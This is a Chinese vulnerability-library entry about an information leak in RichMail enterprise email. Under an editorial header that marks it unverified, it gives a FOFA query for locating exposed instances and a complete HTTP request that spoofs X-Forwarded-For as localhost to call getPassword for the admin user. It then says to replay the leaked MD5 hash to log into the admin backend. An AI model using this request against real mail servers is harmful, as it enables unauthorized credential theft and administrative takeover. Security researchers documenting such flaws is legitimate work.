---
source: "wy876 漏洞文库"
title: "RichMail 企业邮箱敏感信息泄漏漏洞"
product: "RichMail enterprise email"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Version unspecified; trusts X-Forwarded-For loopback condition needs verification"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-9ef2962856fa67fb99482dc0"
entity_id: "ve-9ef2962856fa67fb99482dc0"
schema_version: "1"
---

# RichMail 企业邮箱敏感信息泄漏漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Version unspecified; trusts X-Forwarded-For loopback condition needs verification
- 证据范围：One GET plus assertion MD5 replay logs into admin; no response or login request evidence

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Impact field is product name, not version range
- 'Adjust X-Forwarded-For as needed' omits critical proxy/trust prerequisite
- MD5 is hashing rather than encryption; distinguish hash disclosure and authentication replay
- Claimed admin login chain not documented beyond assertion
- Remove marketing/HTML font boilerplate

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">  Richmail是亚太本土最大的电子邮件系统提供商之一，是新一代智慧企业云邮件系统，以安全、稳定、高效著称。Richmail作为投资千万，自主研发的邮件系统，获得了多项发明专利，凭借移动化、套件化、能力开放及服务计量等等核心技术，持续引领全球邮箱领域的发展方向，每天数以亿计的智慧和信息在Richmail汇聚、碰撞、传递。RichMail某版本存在信息泄漏漏洞，未经授权的攻击者可以利用此漏洞获取企业邮箱的账号密码信息，登陆管理后台。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ RichMail 企业邮箱

# 三、资产测绘
+ fofa`app="Richmail-企业邮箱"`
+ 特征


# 四、漏洞复现
按需调整`X-Forwarded-For: 127.0.0.1`

```http
GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1
Host: xx.xx.xx.xx
Cookie: lang=zh_CN
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


获取管理员MD5加密值后抓去登陆数据包替换即可进入后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nngn0owe1cvrrahv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
